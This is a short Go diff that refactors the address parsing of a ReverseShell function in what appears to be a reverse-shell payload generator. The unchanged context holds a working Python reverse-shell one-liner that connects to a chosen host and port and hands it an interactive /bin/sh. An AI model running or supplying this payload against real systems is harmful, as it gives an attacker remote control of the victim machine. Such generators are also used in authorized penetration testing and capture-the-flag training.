@@ -23,13 +23,10 @@ type payload struct {
 }
 
 func ReverseShell(address string) string {
-	parts := strings.SplitN(address, ":", 2)
-	if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
+	host, port, ok := strings.Cut(address, ":")
+	if !ok || host == "" || port == "" {
 		return usage
 	}
-
-	host := parts[0]
-	port := parts[1]
 
 	payloads := []payload{
 		{"python", fmt.Sprintf(`python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("%s",%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`, host, port)},
